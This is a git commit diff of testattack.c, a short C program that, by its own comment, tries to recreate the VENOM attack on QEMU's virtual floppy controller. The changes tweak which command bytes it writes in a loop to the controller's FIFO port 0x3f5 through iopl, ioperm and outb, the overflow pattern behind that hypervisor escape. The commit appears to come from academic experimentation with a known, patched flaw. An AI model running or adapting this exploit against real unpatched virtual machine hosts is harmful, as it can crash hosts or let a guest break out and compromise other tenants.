4dc72bc24db370bbb84e6b03956e3d0254742d6a
yihao <yzhng127@illinois.edu>
2015-07-02 16:51:15 -0500

    test see if reach next object

--- testattack.c
+++ testattack.c
@@ -7,7 +7,7 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
 #define MAX_COUNT 5
-#define TEST_VAL  0x12
+#define TEST_VAL  0x11
 #define FD_CMD_READ 0x06
 #define WRITE 0x05
 
@@ -15,16 +15,16 @@ int main(void){
         iopl(3);
         ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
-        outb(WRITE, FIFO);
+        outb(SPC_COMMAND, FIFO);
         int i,j;
         j = 0;
         printf("into loop\n");
         for(i=0; i<MAX_COUNT; i++ ){
-                outb(RDID,0x3f5);
+                outb(TEST_VAL,0x3f5);
         }
         // outb(TEST_VAL, FIFO);
         // outb(RDID, FIFO);
         // outb(TEST_VAL, FIFO);
-        outb(FD_CMD_READ, FIFO);
-        printf("try read: %d\n", inb(0x3f5));
+        // outb(FD_CMD_READ, FIFO);
+        // printf("try read: %d\n", inb(0x3f5));
 }
